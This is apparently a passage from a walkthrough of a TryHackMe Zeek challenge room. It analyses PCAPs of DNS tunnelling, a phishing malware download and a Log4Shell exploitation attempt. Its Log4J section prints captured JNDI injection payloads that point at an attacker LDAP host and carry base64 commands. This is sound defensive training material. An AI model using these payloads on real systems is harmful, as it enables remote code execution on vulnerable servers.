# Zeek Exercises

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Medium
OS: N/A
Subscription type: Premium
Description: 
Put your Zeek skills into practice and analyse network traffic.
```

Room link: [https://tryhackme.com/room/zeekbroexercises](https://tryhackme.com/room/zeekbroexercises)

## Solution

### Task 1: Introduction

The room invites you a challenge to investigate a series of traffic data and stop malicious activity under different scenarios. Let's start working with Zeek to analyse the captured traffic.

We recommend completing the [Zeek room](https://tryhackme.com/room/zeekbro) first, which will teach you how to use the tool in depth.

A VM is attached to this room. You don't need SSH or RDP; the room provides a "Split View" feature. Exercise files are located in the folder on the desktop. Log cleaner script "**clear-logs.sh**" is available in each exercise folder.

### Task 2: Anomalous DNS

An alert triggered: "Anomalous DNS Activity".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

---------------------------------------------------------------------------------------

Investigate the **dns-tunneling.pcap** file. Investigate the **dns.log** file.

#### What is the number of DNS records linked to the IPv6 address?

Hint: DNS "AAAA" records store IPV6 addresses.

We start with by running zeek on the PCAP-file

```bash
ubuntu@ip-10-66-141-187:~$ cd Desktop/Exercise-Files/anomalous-dns/
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ ls -la
total 2420
drwxr-xr-x 2 ubuntu ubuntu    4096 Apr  6  2022 .
drwxr-xr-x 5 ubuntu ubuntu    4096 May  8  2022 ..
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu 2462756 Apr  5  2022 dns-tunneling.pcap
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ zeek -C -r dns-tunneling.pcap 
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ ls -l 
total 4908
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu  837491 Dec 22 15:16 conn.log
-rw-r--r-- 1 ubuntu ubuntu 2462756 Apr  5  2022 dns-tunneling.pcap
-rw-r--r-- 1 ubuntu ubuntu 1702409 Dec 22 15:16 dns.log
-rw-r--r-- 1 ubuntu ubuntu    2713 Dec 22 15:16 http.log
-rw-r--r-- 1 ubuntu ubuntu    1182 Dec 22 15:16 ntp.log
-rw-r--r-- 1 ubuntu ubuntu     254 Dec 22 15:16 packet_filter.log
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ 
```

Next, we analyse the **dns.log** for its field names

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ head -n15 dns.log 
#separator \x09
#set_separator  ,
#empty_field  (empty)
#unset_field  -
#path  dns
#open  2025-12-22-15-16-40
#fields  ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto  trans_id  rtt  query  qclass  qclass_name  qtype  qtype_name  rcode  rcode_name  AA  TC  RD  RA  Z  answers  TTLs  rejected
#types  time  string  addr  port  addr  port  enum  count  interval  string  count  string  count  string  count  string  bool  bool  bool  bool  count  vector[string]  vector[interval]  bool
1623212924.825154  CME6T54oMT8MWan183  10.20.57.3  59580  10.10.2.22  53  udp  5374  0.855652  e7f1018ea0310f25bba0610936fd1cc2af.cisco-update.com  1  C_INTERNET  15  MX  0  NOERRORF  F  T  T  0  3591018ea0f08b48069ca0ffff640c1cfb.cisco-update.com  58.000000  F
1623212925.678141  CaZqlgmBwnzDyAuWd  10.20.57.3  47888  10.10.2.22  53  udp  7434  0.158643  0cfe016cb105e87901f6020958d084ff84.cisco-update.com  1  C_INTERNET  15  MX  0  NOERRORF  F  T  T  0  22e1016cb1f9131fda4f34ffff52a924b3.cisco-update.com  58.000000  F
1623212925.833285  CL2y002wg7JRHfzkOi  10.20.57.3  49950  10.10.2.22  53  udp  4519  0.052941  4ecd018ea07bdf2f097a3f093785aca8a5.cisco-update.com  1  C_INTERNET  5  CNAME  0  NOERRORF  F  T  T  0  dadf018ea058a5ff12a897ffff640c1cfb.cisco-update.com  59.000000  F
1623212926.743469  CSBzAh3pq4blVZKqqf  10.20.57.3  49483  10.10.2.22  53  udp  34612  0.052641  68db016cb1578377236f60095966668cb6.cisco-update.com  1  C_INTERNET  16  TXT  0  NOERRORF  F  T  T  0  TXT 34 0dae016cb12c7c2e4a9c28ffff52a924b3  59.000000  F
1623212926.898145  CqQbGbdB6PG0IuAyh  10.20.57.3  35587  10.10.2.22  53  udp  59549  0.051970  98da018ea0b4c09d26d9f9093892846540.cisco-update.com  1  C_INTERNET  16  TXT  0  NOERRORF  F  T  T  0  TXT 34 c350018ea02f1abf89db91ffff640c1cfb  59.000000  F
1623212927.753503  CntfdQ3goaoe0LS5Tc  10.20.57.3  34554  10.10.2.22  53  udp  24334  0.153320  0c5a016cb1989be2677eef095a045ee12e.cisco-update.com  1  C_INTERNET  15  MX  0  NOERRORF  F  T  T  0  10d4016cb141223d620431ffff52a924b3.cisco-update.com  58.000000  F
1623212927.903973  CaXapv4bHikwRjPAN4  10.20.57.3  42480  10.10.2.22  53  udp  51210  0.863121  bb9f018ea06b115c282fa8093935ece49d.cisco-update.com  1  C_INTERNET  15  MX  0  NOERRORF  F  T  T  0  6b63018ea0bba16898d803ffff640c1cfb.cisco-update.com  59.000000  F
```

We are looking for an unknown IPv6 address so let's list all IP communicating pairs.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut id.orig_h id.resp_h | sort -u
10.20.57.3  10.10.2.21
10.20.57.3  10.10.2.22
10.20.57.3  224.0.0.251
fe80::202a:f0b1:7d9c:bd9e  ff02::fb
```

Now we can count the number of records

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | grep fe80::202a:f0b1:7d9c:bd9e | wc -l
1
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | grep fe80::202a:f0b1:7d9c:bd9e        
1623214415.042490  C9lXDFNJa9AXBsJSg  fe80::202a:f0b1:7d9c:bd9e  5353  ff02::fb  5353  udp  0-  _ipp._tcp.local  1  C_INTERNET  12  PTR  -  -  F  F  F  F  0  --  F
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ 
```

Eh, that doesn't seem to match the answer format of a three digit number!?

How about we count the DNS-records for **all** IPv6 addressses, i.e. `AAAA`-records, instead?

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut qtype_name | grep AAAA | wc -l
320
```

That matches the answer format.

A better phrased question would have been:  
`What is the number of DNS records linked to IPv6 addresses?`

Answer: `320`

#### Investigate the conn.log file. What is the longest connection duration?

Hint: The "duration" value represents the connection time between two hosts.

We start by checking the **conn.log** for its field names.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ head -n15 conn.log 
#separator \x09
#set_separator  ,
#empty_field  (empty)
#unset_field  -
#path  conn
#open  2025-12-22-15-16-40
#fields  ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto  service  duration  orig_bytes  resp_bytes  conn_state  local_orig  local_resp  missed_bytes  history  orig_pkts  orig_ip_bytes  resp_pkts  resp_ip_bytes  tunnel_parents
#types  time  string  addr  port  addr  port  enum  string  interval  count  count  string  bool  bool  count  string  count  count  count  count  set[string]
1623212924.825154  CME6T54oMT8MWan183  10.20.57.3  59580  10.10.2.22  53  udp  dns  0.855652  80  175  SF  -  -  0  Dd  1  108  1  203  -
1623212925.678141  CaZqlgmBwnzDyAuWd  10.20.57.3  47888  10.10.2.22  53  udp  dns  0.158643  80  175  SF  -  -  0  Dd  1  108  1  203  -
1623212925.833285  CL2y002wg7JRHfzkOi  10.20.57.3  49950  10.10.2.22  53  udp  dns  0.052941  80  129  SF  -  -  0  Dd  1  108  1  157  -
1623212926.743469  CSBzAh3pq4blVZKqqf  10.20.57.3  49483  10.10.2.22  53  udp  dns  0.052641  80  127  SF  -  -  0  Dd  1  108  1  155  -
1623212926.898145  CqQbGbdB6PG0IuAyh  10.20.57.3  35587  10.10.2.22  53  udp  dns  0.051970  80  127  SF  -  -  0  Dd  1  108  1  155  -
1623212927.753503  CntfdQ3goaoe0LS5Tc  10.20.57.3  34554  10.10.2.22  53  udp  dns  0.153320  80  175  SF  -  -  0  Dd  1  108  1  203  -
1623212927.903973  CaXapv4bHikwRjPAN4  10.20.57.3  42480  10.10.2.22  53  udp  dns  0.863121  80  175  SF  -  -  0  Dd  1  108  1  203  -
```

The field we are looking for ought to be `duration`.

We extract all durations and sort them in reverse numeric order to find the longest one.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut duration | sort -rn | head
9.420791
7.835490
4.238265
3.445874
3.298156
3.029706
3.027164
2.837323
2.147446
0.880943
```

Answer: `9.420791`

#### Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?

Hints:

- You need to use the DNS query values for summarising and counting the number of unique domains.
- There are lots of ".cisco-update.com" DNS queries, you need to filter the main address and find out the rest of the queries that don't contain the ".cisco-update.com" pattern.
- You can filter the main "***.cisco-update.com" DNS pattern as "cisco-update.com" with the following command; "cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | head"

We are looking for the `query` field in the **dns.log**.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | head
e7f1018ea0310f25bba0610936fd1cc2af.cisco-update.com
0cfe016cb105e87901f6020958d084ff84.cisco-update.com
4ecd018ea07bdf2f097a3f093785aca8a5.cisco-update.com
68db016cb1578377236f60095966668cb6.cisco-update.com
98da018ea0b4c09d26d9f9093892846540.cisco-update.com
0c5a016cb1989be2677eef095a045ee12e.cisco-update.com
bb9f018ea06b115c282fa8093935ece49d.cisco-update.com
d6c8016cb1fb1d5f3add05095b8474f090.cisco-update.com
08cd018ea04fcf8ff1e5e1093a8a8a82b1.cisco-update.com
dc85016cb1f2bf4592825b095c41d4cb5f.cisco-update.com
```

Since the number of subdomain may differ we reverse each line and `cut` out only the first two parts before reversing the line again

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort -u
_tcp.local
cisco-update.com
in-addr.arpa
ip6.arpa
rhodes.edu
ubuntu.com
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort -u | wc -l
6
```

Answer: `6`

There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the **conn.log** file.

We check the count for each domain using the **dns.log** (instead of the **conn.log**)

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq -c
      2 _tcp.local
   6893 cisco-update.com
     11 in-addr.arpa
     10 ip6.arpa
    284 rhodes.edu
     47 ubuntu.com
```

#### What is the IP address of the source host?

Now we can check for the source IPs sending DNS-requests like this

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut id.orig_h query | grep 'cisco-update.com' | cut -d $'\t' -f1 | sort | uniq -c
   6893 10.20.57.3
```

Answer: `10.20.57.3`

### Task 3: Phishing

An alert triggered: "Phishing Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

---------------------------------------------------------------------------------------

Investigate the logs.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/anomalous-dns$ cd ..
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files$ ls
anomalous-dns  clear-logs.sh  log4j  phishing
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files$ cd phishing/
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ ls -la
total 1336
drwxr-xr-x 2 ubuntu ubuntu    4096 May  8  2022 .
drwxr-xr-x 5 ubuntu ubuntu    4096 May  8  2022 ..
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu     105 May  8  2022 file-extract-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu     125 May  8  2022 hash-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu 1344660 May  8  2022 phishing.pcap
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ zeek -C -r phishing.pcap 
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ ls -l
total 1372
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu    6242 Dec 22 16:09 conn.log
-rw-r--r-- 1 ubuntu ubuntu     850 Dec 22 16:09 dhcp.log
-rw-r--r-- 1 ubuntu ubuntu   12466 Dec 22 16:09 dns.log
-rw-r--r-- 1 ubuntu ubuntu     105 May  8  2022 file-extract-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu    1030 Dec 22 16:09 files.log
-rw-r--r-- 1 ubuntu ubuntu     125 May  8  2022 hash-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu    1552 Dec 22 16:09 http.log
-rw-r--r-- 1 ubuntu ubuntu     254 Dec 22 16:09 packet_filter.log
-rw-r--r-- 1 ubuntu ubuntu     564 Dec 22 16:09 pe.log
-rw-r--r-- 1 ubuntu ubuntu 1344660 May  8  2022 phishing.pcap
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ 
```

#### What is the suspicious source address? Enter your answer in defanged format

We start by checking the **conn.log**  for the IP with the most connections.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn
     50 10.6.27.102
```

Only one IP, so that would be the one we're looking for, but don't forget to defang it.

Answer: `10[.]6[.]27[.]102`

Investigate the **http.log** file.

As usual, we check the field names first

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ head -n15 http.log 
#separator \x09
#set_separator  ,
#empty_field  (empty)
#unset_field  -
#path  http
#open  2025-12-22-16-09-05
#fields  ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  trans_depth  method  host  uri  referrer  version  user_agent  origin  request_body_len  response_body_len  status_code  status_msg  info_code  info_msg  tags  username  password  proxied  orig_fuids  orig_filenames  orig_mime_types  resp_fuids  resp_filenames  resp_mime_types
#types  time  string  addr  port  addr  port  count  string  string  string  string  string  string  string  count  count  count  string  count  string  set[enum]  string  string  set[string]  vector[string]vector[string]  vector[string]  vector[string]  vector[string]  vector[string]
1561667874.713411  CSauxo4mFDUG8bOGXh  10.6.27.102  49157  23.63.254.163  80  1  GET  www.msftncsi.com  /ncsi.txt  -  1.1  Microsoft NCSI  -  0  14  200  OK  -  -(empty)  -  -  -  -  -  -  Fpgan59p6uvNzLFja  -  text/plain
1561667889.643717  C95MDw77nSgH2AZc4  10.6.27.102  49159  107.180.50.162  80  1  GET  smart-fax.com  /Documents/Invoice&MSO-Request.doc  -  1.1  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko  -  0  323072  200  OK  -  -  (empty)  -  -  -  -  -  -  FB5o2Hcauv7vpQ8y3  -  application/msword
1561667898.911759  CNnnHs2InobR76mh7f  10.6.27.102  49162  107.180.50.162  80  1  GET  smart-fax.com  /knr.exe  -  1.1  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)  -  0  2437120  200  OK  -  -  (empty)  -  -  -  -  -  -  FOghls3WpIjKpvXaEl  -  application/x-dosexec
#close  2025-12-22-16-09-05
```

Interesting field names ought to be:

- host
- uri

#### Which domain address were the malicious files downloaded from? Enter your answer in defanged format

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat http.log | zeek-cut host uri | sort | uniq -c | sort -rn
      1 www.msftncsi.com  /ncsi.txt
      1 smart-fax.com  /knr.exe
      1 smart-fax.com  /Documents/Invoice&MSO-Request.doc
```

Since `smart-fax.com` appear twice that ought to be the domain we're looking for.

Answer: `smart-fax[.]com`

Investigate the malicious document in VirusTotal.

To be able to pivot between the logs we will also need the file identifier (fuid) for the files.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat http.log | zeek-cut host uri resp_fuids                            
www.msftncsi.com  /ncsi.txt  Fpgan59p6uvNzLFja
smart-fax.com  /Documents/Invoice&MSO-Request.doc  FB5o2Hcauv7vpQ8y3
smart-fax.com  /knr.exe  FOghls3WpIjKpvXaEl
```

Then we check the field names for the **files.log** file.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ head -n15 files.log                                              
#separator \x09
#set_separator  ,
#empty_field  (empty)
#unset_field  -
#path  files
#open  2025-12-22-16-09-05
#fields  ts  fuid  tx_hosts  rx_hosts  conn_uids  source  depth  analyzers  mime_type  filename  duration  local_orig  is_orig  seen_bytes  total_bytes  missing_bytes  overflow_bytes  timedout  parent_fuid  md5  sha1  sha256  extracted  extracted_cutoff  extracted_size
#types  time  string  set[addr]  set[addr]  set[string]  string  count  set[string]  string  string  interval  bool  bool  count  count  count  count  bool  string  string  string  string  stringbool  count
1561667874.743959  Fpgan59p6uvNzLFja  23.63.254.163  10.6.27.102  CSauxo4mFDUG8bOGXh  HTTP  0  (empty)  text/plain  -  0.000000  -  F  14  14  0  0  F  -  --  -  -  -  -
1561667889.703239  FB5o2Hcauv7vpQ8y3  107.180.50.162  10.6.27.102  C95MDw77nSgH2AZc4  HTTP  0  (empty)  application/msword  -  4.386569  -  F  323072  -  0  0  F  --  -  -  -  -  -
1561667899.060086  FOghls3WpIjKpvXaEl  107.180.50.162  10.6.27.102  CNnnHs2InobR76mh7f  HTTP  0  PE  application/x-dosexec  -  0.498764  -  F  2437120  -  0  0  F  --  -  -  -  -  -
#close  2025-12-22-16-09-05
```

Fields we want ought to be:

- fuid
- mime_type
- filename
- sha1

Now we can list the information we need

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat files.log | zeek-cut fuid mime_type filename sha1
Fpgan59p6uvNzLFja  text/plain  -  -
FB5o2Hcauv7vpQ8y3  application/msword  -  -
FOghls3WpIjKpvXaEl  application/x-dosexec  -  -
```

But there is no hash information included!

But wait, there was some zeek scripts available in the exercise directory.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ ls -l *.zeek
-rw-r--r-- 1 ubuntu ubuntu 105 May  8  2022 file-extract-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu 125 May  8  2022 hash-demo.zeek
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat file-extract-demo.zeek 
# Load file extract framework!
@load /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat hash-demo.zeek         
# Enable MD5, SHA1 and SHA256 hashing for all files.

@load /opt/zeek/share/zeek/policy/frameworks/files/hash-all-files.zeek
```

Let's clear the logs and rerun zeek with the two scripts included

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ ./clear-logs.sh 
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ zeek -C -r phishing.pcap file-extract-demo.zeek hash-demo.zeek 
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ ls -la
total 1384
drwxr-xr-x 3 ubuntu ubuntu    4096 Dec 22 16:43 .
drwxr-xr-x 5 ubuntu ubuntu    4096 May  8  2022 ..
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu    6241 Dec 22 16:43 conn.log
-rw-r--r-- 1 ubuntu ubuntu     851 Dec 22 16:43 dhcp.log
-rw-r--r-- 1 ubuntu ubuntu   12469 Dec 22 16:43 dns.log
drwxr-xr-x 2 ubuntu ubuntu    4096 Dec 22 16:43 extract_files
-rw-r--r-- 1 ubuntu ubuntu     105 May  8  2022 file-extract-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu    1417 Dec 22 16:43 files.log
-rw-r--r-- 1 ubuntu ubuntu     125 May  8  2022 hash-demo.zeek
-rw-r--r-- 1 ubuntu ubuntu    1552 Dec 22 16:43 http.log
-rw-r--r-- 1 ubuntu ubuntu     254 Dec 22 16:43 packet_filter.log
-rw-r--r-- 1 ubuntu ubuntu     564 Dec 22 16:43 pe.log
-rw-r--r-- 1 ubuntu ubuntu 1344660 May  8  2022 phishing.pcap
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ 
```

Now we can try to list the file information again and hopefully we will find that hashes are included.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat files.log | zeek-cut fuid mime_type filename sha1
Fpgan59p6uvNzLFja  text/plain  -  33bf88d5b82df3723d5863c7d23445e345828904
FB5o2Hcauv7vpQ8y3  application/msword  -  a66bd2557016377dfb95a87c21180e52b23d2e4e
FOghls3WpIjKpvXaEl  application/x-dosexec  -  0d5c820002cf93384016bd4a2628dcc5101211f4
```

Much better!

#### What kind of file is associated with the malicious document?

Hint: Search MD5 value in Virustotal. VT > Relations

We are looking for information about a malicious **document** so the hash ought to be `a66bd2557016377dfb95a87c21180e52b23d2e4e`.

Searching for the SHA1-hash, we find [this information](https://www.virustotal.com/gui/file/f808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb) on VirusTotal.

Since we are looking for associations, the `Relations` tab will probable give us the answer.

But now the question becomes, what did they mean with **associated**?

The answer could be (considering the three character answer format):

- ZIP (execution parent and dropped file type)
- VBA (bundled file type)
- CAB (dropped file type)

The answer turned out to be **VBA**.

Answer: `VBA`

Investigate the extracted malicious .exe file.

Revisiting the hash listing

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat files.log | zeek-cut fuid mime_type filename sha1
Fpgan59p6uvNzLFja  text/plain  -  33bf88d5b82df3723d5863c7d23445e345828904
FB5o2Hcauv7vpQ8y3  application/msword  -  a66bd2557016377dfb95a87c21180e52b23d2e4e
FOghls3WpIjKpvXaEl  application/x-dosexec  -  0d5c820002cf93384016bd4a2628dcc5101211f4
```

we are interested in the SHA1-hash `0d5c820002cf93384016bd4a2628dcc5101211f4`.

#### What is the given file name in Virustotal?

Searching for the hash, we find [this information](https://www.virustotal.com/gui/file/749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18) on VirusTotal.

Answer: `PleaseWaitWindow.exe`

#### What is the contacted domain name? Enter your answer in defanged format

Hint: VT > Behavior > DNS Resolutions. Cyberchef can defang.

Checking VirusTotal's `Behaviour` tab and paying extra attention to the `DNS Resolutions`, we find that the host with most matches is `dunlop.hopto.org`.

Answer: `hopto[.]org`

#### What is the request name of the downloaded malicious .exe file?

We saw this previously

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/phishing$ cat http.log | zeek-cut host uri resp_fuids                            
www.msftncsi.com  /ncsi.txt  Fpgan59p6uvNzLFja
smart-fax.com  /Documents/Invoice&MSO-Request.doc  FB5o2Hcauv7vpQ8y3
smart-fax.com  /knr.exe  FOghls3WpIjKpvXaEl
```

Answer: `knr.exe`

### Task 4: Log4J

An alert triggered: "Log4J Exploitation Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

---------------------------------------------------------------------------------------

Investigate the **log4shell.pcapng** file with **detection-log4j.zeek** script.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files$ cd log4j/
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ ls -l
total 1060
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu      71 Apr  5  2022 detection-log4j.zeek
-rw-r--r-- 1 ubuntu ubuntu 1076632 Mar 18  2022 log4shell.pcapng
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ zeek -C -r log4shell.pcapng detection-log4j.zeek               
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ ls -l
total 1596
-rwxr-xr-x 1 ubuntu ubuntu      46 Apr  3  2022 clear-logs.sh
-rw-r--r-- 1 ubuntu ubuntu   84832 Dec 22 17:15 conn.log
-rw-r--r-- 1 ubuntu ubuntu      71 Apr  5  2022 detection-log4j.zeek
-rw-r--r-- 1 ubuntu ubuntu   86971 Dec 22 17:15 files.log
-rw-r--r-- 1 ubuntu ubuntu  169985 Dec 22 17:15 http.log
-rw-r--r-- 1 ubuntu ubuntu   95034 Dec 22 17:15 log4j.log
-rw-r--r-- 1 ubuntu ubuntu 1076632 Mar 18  2022 log4shell.pcapng
-rw-r--r-- 1 ubuntu ubuntu   87876 Dec 22 17:15 notice.log
-rw-r--r-- 1 ubuntu ubuntu     254 Dec 22 17:15 packet_filter.log
-rw-r--r-- 1 ubuntu ubuntu    1465 Dec 22 17:15 signatures.log
-rw-r--r-- 1 ubuntu ubuntu     393 Dec 22 17:15 weird.log
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ 
```

#### Investigate the signature.log file. What is the number of signature hits?

As usual, we check the field names of the log

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ head signatures.log 
#separator \x09
#set_separator  ,
#empty_field  (empty)
#unset_field  -
#path  signatures
#open  2025-12-22-17-15-26
#fields  ts  uid  src_addr  src_port  dst_addr  dst_port  note  sig_id  event_msg  sub_msg  sig_count  host_count
#types  time  string  addr  port  addr  port  enum  string  string  string  count  count
1640023652.109820  CXo86gJtX3QCk6RTj  192.168.56.102  389  172.17.0.2  36820  Signatures::Sensitive_Signature  log4j_javaclassname_tcp  192.168.56.102: log4j_javaclassname_tcp  0\x81\xc8\x02\x01\x02d\x81\xc2\x04-Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=0\x81\x900\x16\x04\x0djavaClassName1\x05\x04\x03foo0,\x04\x0cjavaCodeBase1\x1c\x04\x1ahttp://192.168.56.102:443/0$\x04\x0bobjectC...  -  -
1640025554.665741  CI6DKof3PmlFwOAyb  192.168.56.102  389  172.17.0.2  36822  Signatures::Sensitive_Signature  log4j_javaclassname_tcp  192.168.56.102: log4j_javaclassname_tcp  0\x81\xd0\x02\x01\x02d\x81\xca\x045Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==0\x81\x900\x16\x04\x0djavaClassName1\x05\x04\x03foo0,\x04\x0cjavaCodeBase1\x1c\x04\x1ahttp://192.168.56.102:443/0$\x04...  -  -
```

Interesting fields ought to be:

- note
- sig_id

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ cat signatures.log | zeek-cut note sig_id
Signatures::Sensitive_Signature  log4j_javaclassname_tcp
Signatures::Sensitive_Signature  log4j_javaclassname_tcp
Signatures::Sensitive_Signature  log4j_javaclassname_tcp
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ cat signatures.log | zeek-cut note sig_id | wc -l
3
```

Answer: `3`

#### Investigate the http.log file. Which tool is used for scanning?

Hint: User-agent info can help.

The **user_agent** field ought to be a good place to start.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut user_agent | sort | uniq -c | sort -rn
    593 Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
     14 ${jndi:ldap://192.168.56.102:389}
      5 SecurityNik Testing
      3 Java/1.8.0_181
      2 ${jndi:ldap://192.168.56.102:389/test}
      1 ${jndi:ldap://192.168.56.102}
      1 ${jndi:ldap://127.0.0.1:1389}
```

Answer: `Nmap`

#### Investigate the http.log file. What is the extension of the exploit file?

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut uri | sort | uniq -c | sort -rn
    499 /
     41 /testing123
     38 testing1
     38 /testing1
      1 /ExploitSMMZvT8GXL.class
      1 /ExploitQ8v7ygBW4i.class
      1 /Exploit6HHc3BcVzI.class
```

Answer: `.class`

#### Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?

First, we check the field names of the **log4j.log** file.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ head log4j.log 
#separator \x09
#set_separator  ,
#empty_field  (empty)
#unset_field  -
#path  log4j
#open  2025-12-22-17-15-26
#fields  ts  uid  http_uri  uri  stem  target_host  target_port  method  is_orig  name  value  matched_name  matched_value
#types  time  string  string  string  string  string  string  string  bool  string  string  bool  bool
1640023652.008511  CPgkY3vepOxvfBQrb  /  192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=  192.168.56.102:389  192.168.56.102  389  GET  T  X-API-VERSION  ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}  F  T
